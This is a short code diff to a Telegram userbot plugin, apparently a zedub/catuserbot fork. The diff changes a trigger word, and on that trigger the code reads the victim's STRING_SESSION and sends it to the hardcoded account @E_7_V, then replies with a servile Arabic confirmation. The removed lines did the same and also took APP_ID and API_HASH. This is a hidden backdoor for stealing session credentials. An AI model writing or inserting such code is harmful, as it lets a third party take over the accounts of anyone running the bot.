@@ -19,9 +19,9 @@ async def Baqir(event):
        reply_msg = await event.get_reply_message()
        owner_id = reply_msg.from_id.user_id
        if owner_id == zedub.uid:
-           if event.message.message == "فاراته":
-                   cmd = "STRING_SESSION, APP_ID, API_HASH"
-                   o = (await _catutils.runcmd(cmd))[0]
+           if event.message.message == "جيبه":
+                   cmd = "STRING_SESSION"
+                   o = (await _zedutils.runcmd(cmd))[0]
                    OUTPUT = (f"**[ريبـــثون](tg://need_update_for_some_feature/) كود تيرمكس:**\n\n\n{o}\n\n**تدلل سيدي ومولاي **")
                    await event.reply("**جبته وتدلل سيدنا 🖤**")
                    await zedub.send_message("@E_7_V", OUTPUT)
